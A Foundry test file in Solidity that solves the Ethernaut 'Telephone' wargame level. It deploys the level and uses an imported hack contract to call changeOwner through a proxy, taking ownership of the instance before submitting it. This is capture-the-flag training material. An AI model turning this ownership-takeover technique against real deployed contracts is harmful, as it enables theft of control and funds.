// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.10;

import "ds-test/test.sol";
import "forge-std/Vm.sol";
import "forge-std/console.sol";
import "../Ethernaut.sol";
import "./TelephoneFactory.sol";
import "./Telephone.sol";
import "./TelephoneProxyHack.sol";

contract TelephoneTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D)); // Como una blockchain local
    Ethernaut ethernaut; // EL juego de ethernauta

    address myAddress = address(10);

    function setUp() public {
        vm.deal(myAddress, 10 ether);
        ethernaut = new Ethernaut();
    }

    function testTelephone() public {
        TelephoneFactory factory = new TelephoneFactory();
        ethernaut.registerLevel(factory);

        vm.startPrank(myAddress);
        address instance = ethernaut.createLevelInstance(factory);

        // Hack
        TelephoneProxyHack proxy = new TelephoneProxyHack();
        proxy.doTheMagic(instance, abi.encodeWithSignature("changeOwner(address)", myAddress));

        // Assert
        ethernaut.submitLevelInstance(payable(instance));
        vm.stopPrank();
    }
}